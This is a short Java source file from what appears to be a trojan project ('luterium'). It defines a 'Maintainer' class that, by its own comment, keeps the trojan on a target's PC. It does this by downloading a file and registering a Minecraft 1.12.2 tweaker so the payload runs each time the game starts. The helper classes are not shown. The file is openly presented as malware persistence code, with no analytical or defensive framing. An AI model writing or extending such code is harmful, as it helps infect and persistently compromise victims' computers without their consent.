package dev.peter.luterium.features.maintainer;

import dev.peter.luterium.payload.PayloadExecutor;

/**
 * @author Peter
 * @since 04/14/2023
 * Hello there! I'm back with interesting features!
 * Maintainer is the feature that keeps the trojan on target's PC, running everytime they start Minecraft 1.12.2.
 */

public class Maintainer implements PayloadExecutor {
    @Override
    public void execute() throws Exception {
        Downloader.downloadFile(); //Downloads the file.
        Tweaker.registerTweaker(); //Registers the tweaker so it auto-runs.
    }
}
